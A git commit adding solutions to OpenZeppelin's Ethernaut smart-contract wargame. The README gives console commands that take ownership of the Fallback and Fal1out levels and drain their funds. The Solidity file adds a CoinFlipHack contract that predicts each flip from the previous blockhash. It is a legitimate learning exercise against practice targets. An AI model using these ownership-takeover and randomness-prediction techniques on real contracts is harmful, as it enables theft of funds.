ae85b1b899206313953680655e0d3d2519e33d50
rdCenteno <ronnydemera@gmail.com>
2022-09-08 00:16:04 +0200

    Refactor CoinFlip solution

--- README.md
+++ README.md
@@ -1,1 +1,31 @@
 # openzeppelin-ethernaut
+
+
+## Fallback
+
+The first step is to call the funtion contribute, to be able to call the fallback funtion a get the ownership of the contract 
+
+`await contract.contribute({value: toWei("0.0001")});`
+
+`await sendTransaction({ from: player, to: contract.address, value: toWei("0.0001")});`
+
+After claiming the ownership of the contract, withdraw the total value of the contract, calling the withdraw method
+
+`await contract.withdraw()`
+
+## Fal1out
+
+The alleged constructor is not well written, so it not called when the contract is created. To claim the ownership just call the Fal1out method and then withdraw the value of the contract calling the method collectAllocations
+
+`await contract.Fal1out({value: toWei("0.0001")})`
+
+`await contract.collectAllocations()`
+
+## CoinFlip
+
+Create a contract that calls the CoinFlip contract, this contract uses the same method to guess the coin side
+
+`uint256 blockValue = uint256(blockhash(block.number.sub(1)));`
+`uint256 coinFlip = blockValue.div(FACTOR);`
+`bool guess = coinFlip == 1;`
+`coinFlipContract.flip(guess);`
--- contracts/CoinFlip.sol
+++ contracts/CoinFlip.sol
@@ -1,20 +1,17 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "@openzeppelin/contracts/math/SafeMath.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol";
 
 contract CoinFlip {
-    CoinFlip originalContract; //SOL
     using SafeMath for uint256;
     uint256 public consecutiveWins;
     uint256 lastHash;
     uint256 FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    //SOL
-    constructor(CoinFlip _originalContract) public {
+    constructor() public {
         consecutiveWins = 0;
-        originalContract = _originalContract;
     }
 
     function flip(bool _guess) public returns (bool) {
@@ -36,19 +33,24 @@ contract CoinFlip {
             return false;
         }
     }
-
-    //SOL
-    function hackFlip(bool _guess) public {
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-        uint256 coinFlip = blockValue.div(FACTOR);
-        bool side = coinFlip == 1 ? true : false;
-
-        if (side == _guess) {
-            originalContract.flip(_guess);
-        } else {
-            originalContract.flip(!_guess);
-        }
-    }
 }
 
-// 10 Consecutive wins
+contract CoinFlipHack {
+    using SafeMath for uint256;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    CoinFlip coinFlipContract;
+
+    constructor(CoinFlip _coinFlipContract) public {
+        coinFlipContract = _coinFlipContract;
+    }
+
+    //SOL
+    function hackFlip() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool guess = coinFlip == 1;
+        coinFlipContract.flip(guess);
+    }
+}
